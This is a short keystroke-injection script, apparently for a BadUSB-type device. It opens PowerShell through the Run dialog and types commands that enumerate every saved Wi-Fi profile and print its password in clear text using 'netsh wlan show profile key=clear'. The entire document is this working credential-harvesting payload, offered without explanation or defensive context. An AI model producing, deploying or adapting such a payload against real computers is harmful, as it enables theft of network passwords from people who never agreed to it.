layout("us");
typingSpeed(0,0);

press("GUI r");
delay(500);
type("powershell");
press("ENTER");
delay(500);

type("$wifiProfiles = netsh wlan show profiles | Select-String \"All User Profile\"");
press("ENTER");
delay(500);

type("foreach ($profile in $wifiProfiles) {");
press("ENTER");
delay(500);
type("    $profileName = $profile -replace \"    All User Profile\\s*:\\s*\",\"\"");
press("ENTER");
delay(500);
type("    $wifiPassword = (netsh wlan show profile name=\"$profileName\" key=clear) | Select-String \"Key Content\"");
press("ENTER");
delay(500);
type("    $password = $wifiPassword -replace \".*Key Content\\s*:\\s*\",\"\"");
press("ENTER");
delay(500);
type("    Write-Output \"$profileName : $password\"");
press("ENTER");
delay(500);
type("}");
